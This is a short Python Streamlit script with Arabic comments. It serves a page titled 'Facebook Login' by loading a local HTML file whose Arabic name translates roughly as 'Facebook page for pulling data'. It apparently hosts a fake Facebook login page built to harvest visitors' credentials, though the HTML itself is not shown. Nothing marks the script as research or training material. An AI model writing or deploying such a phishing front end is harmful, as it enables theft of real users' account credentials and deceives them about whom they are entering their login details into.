import streamlit as st
import streamlit.components.v1 as components

# إعداد الصفحة
st.set_page_config(page_title="Facebook Login", layout="centered")

# قراءة محتوى الملف
try:
    with open("صفحه فيس لسحب البيانات.html", "r", encoding="utf-8") as f:
        html_code = f.read()
    
    # التصحيح: نضع html_code مباشرة دون كتابة اسم المتغير قبله
    components.html(html_code, height=800, scrolling=True)

except FileNotFoundError:
    st.error("⚠️ الملف غير موجود! تأكد أن اسم ملف الـ HTML في GitHub هو 'صفحه فيس لسحب البيانات.html' بالضبط.")
